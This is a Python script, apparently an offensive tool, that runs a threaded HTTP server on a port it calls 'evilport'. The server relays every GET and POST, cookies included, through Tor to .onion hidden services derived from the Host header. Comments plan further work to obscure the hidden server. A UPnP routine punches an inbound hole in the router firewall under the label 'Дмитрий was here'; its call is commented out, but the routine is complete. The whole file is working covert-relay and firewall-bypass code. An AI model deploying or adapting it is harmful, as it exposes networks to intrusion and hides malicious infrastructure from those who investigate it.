#!/usr/bin/env python3

# Code inspired by @singe
# tor implementation by @raymondmorsman

from http.server import BaseHTTPRequestHandler, HTTPServer
from requests import Session
from cgi import parse_header, parse_multipart
from urllib.parse import parse_qs
from socketserver import ThreadingMixIn
import socket
import upnpclient

evilport=1337
outsideport=58844

class CallBackSrv(BaseHTTPRequestHandler):

  protocol_version = 'HTTP/1.1'
  session = Session()

  def do_GET(self):
    onionurl = self.headers['Host']
    if (onionurl.lower() == 'members.dyndns.org' or onionurl.lower() == 'www.dyn.org'):
        return
    print(onionurl)
    # to do, encryption mechanisms to deploy to multiplex transmissions and obsure the hidden server
    onionurlmod = onionurl[0:onionurl.find('.')]
    onionurlmod = 'http://oragur'+onionurlmod+'.onion'
    print(onionurl)
    xheader = {'X-Forwarded-For':onionurl, 'Cookie':self.headers['Cookie']}
    resp = self.session.get(onionurlmod + self.path, allow_redirects=True, headers=xheader, proxies=dict(http='socks5h://localhost:9050',https='socks5h://localhost:9050'))
    self.send_response(resp.status_code)
    self.send_header('Content-Length', len(resp.content))
    self.end_headers()
    self.wfile.write(resp.content)

  def parse_POST(self):
    length = int(self.headers['content-length'])
    postvars = self.rfile.read(length)
    return postvars

  def do_POST(self):
    postvars = self.parse_POST()
    onionurl = self.headers['Host']
    if (onionurl.lower() == 'members.dyndns.org' or onionurl.lower() == 'www.dyn.org'):
        return
    print(onionurl)
    # to do, encryption mechanisms to deploy to multiplex transmissions and obsure the hidden server
    onionurlmod = onionurl[0:onionurl.find('.')]
    onionurlmod = 'http://oragur'+onionurlmod+'.onion'
    print(onionurl)
    xheader = {'X-Forwarded-For':onionurl, 'Cookie':self.headers['Cookie']}
    resp = self.session.post(onionurlmod + self.path, headers=xheader,
                             data=postvars,
                             allow_redirects=True,  proxies=dict(http='socks5h://localhost:9050',https='socks5h://localhost:9050'))
    self.send_response(resp.status_code)
    self.send_header('Content-Length', len(resp.content))
    self.end_headers()
    self.wfile.write(resp.content)

  def log_message(self, format, *args):
    return


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
  """ Make our HTTP server multi-threaded """

def getIP():
    my_hostname=socket.gethostname()
    return(socket.gethostbyname(my_hostname))

def punchHole(ip,eport,oport):
    upnpdevices = upnpclient.discover()
    firstdevice = upnpdevices[0] # assume only one
    firstdevice.WANIPConn1.AddPortMapping(
        NewRemoteHost='0.0.0.0',
        NewExternalPort=oport,
        NewProtocol='TCP',
        NewInternalPort=eport,
        NewInternalClient=ip,
        NewEnabled='1',
        NewPortMappingDescription='Дмитрий was here',
        NewLeaseDuration=84600)
    print('Forwarding is enabled')
    return()

ip = getIP()
print('punching hole in firewall for %s:%d to external IP port %d' % (ip,evilport,outsideport))
# punchHole(ip,evilport,outsideport)
print('Starting webserver')
httpd = ThreadedHTTPServer(('', evilport), CallBackSrv)
httpd.serve_forever()
